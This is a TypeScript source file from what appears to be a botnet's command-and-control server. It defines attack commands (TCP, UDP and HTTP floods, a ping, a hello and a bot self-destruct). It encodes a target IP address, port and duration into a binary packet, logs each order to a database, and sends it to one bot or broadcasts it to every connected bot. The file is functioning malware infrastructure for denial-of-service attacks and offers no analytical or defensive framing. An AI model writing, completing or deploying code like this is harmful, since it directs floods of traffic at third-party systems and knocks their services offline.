import net from 'net';
import { SocketManager } from '@/clients';
import { Database } from '@/database';

export enum CommandType {
    PING = 1 << 0,  // C2 check if bot is alive
    HELLO = 1 << 1, // C2 send this when connection begins
    ATTACK_TCP = 1 << 2,
    ATTACK_UDP = 1 << 3,
    ATTACK_HTTP = 1 << 4,
    EXIT = 1 << 5,  // Self-destruct bot
}

export class Command {
    private readonly socket: net.Socket | undefined;
    private readonly type: CommandType;
    private readonly duration: number;
    private readonly targetIp: string;
    private readonly port: number;

    private static readonly TERMINATOR = 0x0A;

    public constructor(type: CommandType, duration: number, targetIp: string, port: number, socket?: net.Socket) {
        this.type = type;
        this.duration = duration;
        this.targetIp = targetIp;
        this.port = port;

        this.socket = socket;
    }

    public static async getAllCommands() {
        return await Database.db.get('commands') || []

    }

    public build(): Buffer {
        const parsedIp = this.targetIp.split('.').map(Number);
        if (parsedIp.length !== 4 || parsedIp.some(isNaN)) {
            throw new Error(`Invalid IP address: ${this.targetIp}`);
        }

        //Split the port in 2 different bytes
        const portHigh = (this.port >> 8) & 0xFF;
        const portLow = this.port & 0xFF;

        (async () => {
            await Database.db.push('commands', `Type: ${this.type}\nDuration: ${this.duration}\nTargetIp: ${this.targetIp}\nTargetPort: ${this.port}`)
        })()

        return Buffer.from(new Uint8Array([
            this.type,
            this.duration,
            ...parsedIp,
            portHigh,
            portLow,
            Command.TERMINATOR
        ]));
    }

    public send(): boolean {

        if (this.socket)
            return this.socket.write(this.build());

        return false;
    }

    public async sendToAll(): Promise<void> {
        return await SocketManager.broadcastMessage(this.build());
    }
}